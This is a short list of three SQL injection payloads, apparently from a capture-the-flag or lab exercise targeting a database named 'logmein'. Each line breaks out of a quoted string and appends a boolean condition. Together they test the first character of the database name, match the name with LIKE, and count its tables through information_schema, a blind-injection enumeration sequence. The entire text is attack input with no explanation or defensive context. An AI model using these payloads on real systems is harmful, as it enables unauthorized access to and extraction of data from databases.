'' or select(substring(database(), 1, 1))='l'#;-- !
'' or select database() like "logmein";-- !
'' or (select count(*) from information_schema.tables where table_schema='logmein')=1;-- !